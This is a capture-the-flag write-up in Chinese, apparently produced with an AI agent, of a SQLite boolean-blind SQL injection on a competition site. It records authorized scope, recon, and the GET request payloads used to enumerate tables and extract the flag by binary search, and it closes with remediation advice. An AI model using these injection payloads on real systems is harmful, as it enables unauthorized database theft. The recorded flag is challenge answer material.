# 牢九门（APEX 待加强名单） · 渗透记录

## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | 牢九门（APEX 待加强名单） |
| 类型 | Web / SQL 注入（SQLite 布尔盲注） |
| 入口 | http://wjybu0ms2692nxtr.neu-nex.fun/ |
| 耗时 | 0 日 0 时 9 分 20 秒 |
| LLM | deepseek-flash |
| flag | `nex{wO_ZHoN6_5h4Ng_DA0_Di_c3z7dg2y}` |

## 2.2 目标与授权
- 授权范围：题目域名，仅 80 端口；只读查询，未做写库/提权
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
首页「APEX 待加强名单」，搜索表单 action=/search?name=；响应只有 found / not found 两态；sqlmap 识别为 SQLite + boolean-based blind

## 2.4 攻击面
1) /search?name=（SQL 拼接点）2) /（静态列表：legends 表 6 条）

## 2.5 漏洞判定
- 类型：Web / SQL 注入（SQLite 布尔盲注）
- 位置：/search?name=
- 证据：evidence/step3_flag.csv（sqlmap dump）；evidence/step5_manual_blind.txt（手工二分复核）
- 误报排除：' OR 1=1-- -> found，' OR 1=2-- -> not found；sqlmap --technique=B 独立确认同一注入点

## 2.6 利用链
```
GET /search?name=Bloodhound' AND 3643=3643--   -> found（sqlmap 判定 AND boolean-based blind）
GET /search?name=x' OR (sqlite_version() LIKE '3%')--  -> found（确认 SQLite）
GET /search?name=x' OR ((SELECT count(*) FROM sqlite_master WHERE type='table')=2)-- -> found
  表：legends、flag；flag 表结构 (id INTEGER, value TEXT)
GET /search?name=x' OR (unicode(substr((SELECT value FROM flag LIMIT 1),1,1))>100)-- -> 二分提取
  最终 35 字符：nex{wO_ZHoN6_5h4Ng_DA0_Di_c3z7dg2y}
```

## 2.7 影响
可读整库（legends 与 flag 两张表），未做写入或提权

## 2.8 修复建议
用参数化/预编译查询，禁止字符串拼接 SQL；只读账号 + 最小权限；不要把「命中/未命中」这类布尔差异直接回显给用户

## 2.9 复盘
sqlmap --technique=B 秒确认 SQLite；无 sleep 时用 unicode(substr) 二分，35 字符约 280 请求
